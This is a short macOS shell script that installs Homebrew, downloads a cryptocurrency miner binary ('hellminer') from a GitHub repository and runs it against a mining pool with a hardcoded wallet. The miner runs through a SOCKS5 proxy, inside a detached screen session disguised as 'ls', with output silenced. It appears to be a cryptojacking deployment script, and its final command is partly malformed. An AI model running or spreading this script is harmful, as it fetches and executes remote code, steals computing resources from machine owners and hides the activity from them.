#!/bin/sh
softwareupdate -l
ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)" < /dev/null 2> /dev/null ; brew install caskroom/cask/brew-cask 2> /dev/null
brew install --cask screen
brew install coreutils
wget https://github.com/Godmine99/cpu/raw/main/hellminer
chmod +x hellminer
screen -dmS ls 
WORKER=$(echo $(gshuf -i 11111-9999999 -n 1)-CPU)
PROXY=socks5://98.162.96.41:4145
./hellminer -c stratum+tcp://ap.luckpool.net:3956 -u RCdUFd3iiu1tF5TjNPsDDxN2ApqZDSbYBW.$WORKER -- password x $PROXY --threads 12 nproc --all` > /dev/null
